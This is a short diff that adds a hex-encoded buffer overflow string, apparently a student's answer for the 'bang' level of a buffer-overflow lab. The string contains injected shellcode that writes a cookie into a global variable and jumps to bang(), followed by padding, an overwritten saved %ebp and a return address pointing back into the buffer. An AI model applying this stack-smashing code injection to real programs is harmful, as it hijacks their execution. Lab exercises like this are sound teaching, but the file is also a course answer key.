@@ -1,0 +1,14 @@
+/* 40 Byte Buffer */
+c7 05 40 e1 04 08 ae /* movl $0x47712eae(cookie for 2015011372), 0x804e140(global_val memory address) */
+2e 71 47 /* auto generated */
+68 e9 8b 04 08 /* push $0x8048be9(bang(int) memory address) */
+c3 /* ret */
+/* above are buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* old %ebp */
+38 35 68 55 /* return address: line 1 instruction memory address */
